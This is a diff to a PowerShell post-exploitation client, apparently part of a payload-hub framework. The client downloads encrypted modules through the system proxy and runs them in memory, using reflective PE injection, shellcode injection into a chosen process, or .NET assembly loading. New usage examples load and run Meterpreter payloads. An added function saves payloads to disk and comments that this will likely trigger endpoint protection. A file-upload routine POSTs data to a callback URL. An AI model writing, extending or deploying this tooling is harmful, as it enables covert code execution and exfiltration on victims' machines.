@@ -63,9 +63,9 @@ function Import-HubModule {
     }
 
     if ($?){
-        Write-Host ("[*] {0} imported." -f $Module["name"])
+        Write-Verbose ("[*] {0} imported." -f $Module["name"])
     } else {
-        Write-Host ("[*] Failed to import {0}" -f $Module["name"])
+        Write-Error ("[*] Failed to import {0}" -f $Module["name"])
     }
 }
 
@@ -171,6 +171,7 @@ Use the '-Verbose' option to print detailed information.
     $K=new-object net.webclient;
     $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
     $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
+    $result = @()
     foreach ($i in $indices) {
         if ($i -lt $Modules.length -and $i -ge 0) {
             $compression = "&c=1"
@@ -179,7 +180,9 @@ Use the '-Verbose' option to print detailed information.
             $Modules[$i]["code"] = $K.downloadstring($url);
             Import-HubModule $Modules[$i]
         }
+        $result += $Modules[$i]
     }
+    $result
 }
 
 
@@ -196,25 +199,84 @@ Run-Exe 47
 Description
 -----------
 Execute the exe module 47 in memory
+
+.EXAMPLE
+
+Load-HubModule meterpreter.exe | Run-Exe
+
+Description
+-----------
+
+Load the exe module with the name 'meterpreter.exe' in memory and run it
 #>
     Param(
-        [parameter(Mandatory=$true)]
-        [Int]
-        $n
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module
     )
 
     if (Get-Command "Invoke-ReflectivePEInjection" -errorAction SilentlyContinue)
     {
-        $code = $Modules[$n]["code"]
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
-        Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
+        foreach ($n in $Module) {
+            if ($n.gettype() -eq [Int32]) {
+                $code = $Modules[$n]["code"]
+            } else {
+                $code = $n["code"]
+            }
+            $code = [System.Convert]::FromBase64String($code)
+            $code = Decrypt-Code $code $KEY
+            $code = Unzip-Code $code
+            Invoke-ReflectivePEInjection -PEBytes $code -ForceASLR
+        }
     } else {
-        Write-Host "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
+        Write-Error "[-] PowerSploit's Invoke-ReflectivePEInjection not available. You need to load it first."
     }
 }
 
+function Save-HubModule {
+<#
+.SYNOPSIS
+
+Saves a loaded module to disk. WARNING: This will most likely trigger endpoint protection!
+
+.EXAMPLE
+
+Save-HubModule 41 -Directory tmp/
+
+Description
+-----------
+Save module 41 to directory tmp/
+
+.EXAMPLE
+
+Load-HubModule meterpreter.exe | Save-HubModule
+
+Description
+-----------
+
+Load the exe module with the name 'meterpreter.exe' in memory and save it to disk
+#>
+    Param(
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$false,Position=1)] $Directory = ""
+    )
+
+    foreach ($n in $Module) {
+        if ($n.gettype() -eq [Int32]) {
+            $m = $Modules[$n]
+        } else {
+            $m = $n
+        }
+        $code = $m["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
+        if ($Directory) {
+            $Filename = "$Directory/$($m['shortname'])"
+        } else {
+            $Filename = $m["shortname"]
+        }
+        $code | Set-Content "$Filename" -Encoding Byte
+    }
+}
 
 function Run-DotNETExe {
 <#
@@ -230,26 +292,37 @@ Run-DotNETExe 47 "system"
 Description
 -----------
 Load and execute the .NET binary 47 in memory with the parameter "system"
+
+.EXAMPLE
+
+Load-HubModule meterpreter.exe | Run-DotNETExe
+
+Description
+-----------
+
+Load the .NET module with the name 'meterpreter.exe' in memory and run it
 #>
 
     Param(
-        [parameter(Mandatory=$true)]
-        [Int]
-        $n,
-
-        [parameter(Mandatory=$false)]
-        [string[]] $Arguments
-
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [parameter(Mandatory=$false)] [string[]] $Arguments
     )
 
-    $code = $Modules[$n]["code"]
-    $code = [System.Convert]::FromBase64String($code)
-    $code = Decrypt-Code $code $KEY
-    $code = Unzip-Code $code
-    $a = [Reflection.Assembly]::Load([byte[]]$code)
-    $al = New-Object -TypeName System.Collections.ArrayList
-    $al.add($Arguments)
-    $a.EntryPoint.Invoke($Null, $al.ToArray());
+    foreach ($n in $Module) {
+        if ($n.gettype() -eq [Int32]) {
+            $m = $Modules[$n]
+        } else {
+            $m = $n
+        }
+        $code = $m["code"]
+        $code = [System.Convert]::FromBase64String($code)
+        $code = Decrypt-Code $code $KEY
+        $code = Unzip-Code $code
+        $a = [Reflection.Assembly]::Load([byte[]]$code)
+        $al = New-Object -TypeName System.Collections.ArrayList
+        $al.add($Arguments)
+        $a.EntryPoint.Invoke($Null, $al.ToArray());
+    }
 }
 
 
@@ -266,30 +339,41 @@ Run-Shellcode 47
 Description
 -----------
 Execute the shellcode module 47 in memory
+
+.EXAMPLE
+
+Load-HubModule meterpreter.bin | Run-Shellcode
+
+Description
+-----------
+
+Load the shellcode module with the name 'meterpreter.bin' in memory and run it
 #>
     Param(
-        [parameter(Mandatory=$true)]
-        [Int]
-        $n,
-
-        [ValidateNotNullOrEmpty()]
-        [UInt16]
-        $ProcessID
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)] $Module,
+        [ValidateNotNullOrEmpty()] [UInt16] $ProcessID
     )
 
     if (Get-Command "Invoke-Shellcode" -errorAction SilentlyContinue)
     {
-        $code = $Modules[$n]["code"]
-        $code = [System.Convert]::FromBase64String($code)
-        $code = Decrypt-Code $code $KEY
-        $code = Unzip-Code $code
-        if ($ProcessID) {
-            Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
-        } else {
-            Invoke-Shellcode -Shellcode $code
+        foreach ($n in $Module) {
+            if ($n.gettype() -eq [Int32]) {
+                $m = $Modules[$n]
+            } else {
+                $m = $n
+            }
+            $code = $m["code"]
+            $code = [System.Convert]::FromBase64String($code)
+            $code = Decrypt-Code $code $KEY
+            $code = Unzip-Code $code
+            if ($ProcessID) {
+                Invoke-Shellcode -Shellcode $code -ProcessID $ProcessID
+            } else {
+                Invoke-Shellcode -Shellcode $code
+            }
         }
     } else {
-        Write-Host "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
+        Write-Error "[-] PowerSploit's Invoke-Shellcode not available. You need to load it first."
     }
 }
 
@@ -324,8 +408,6 @@ function Send-File {
         $Body,
         "--$boundary--$LF"
     ) -join $LF
-
-    # $response = Invoke-RestMethod -Uri $($CALLBACK_URL + "u?noredirect=1") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
 
     $post_url = $($CALLBACK_URL + "u?noredirect=1")
     {{'Write-Debug "POSTing the file to $post_url..."'|debug}}
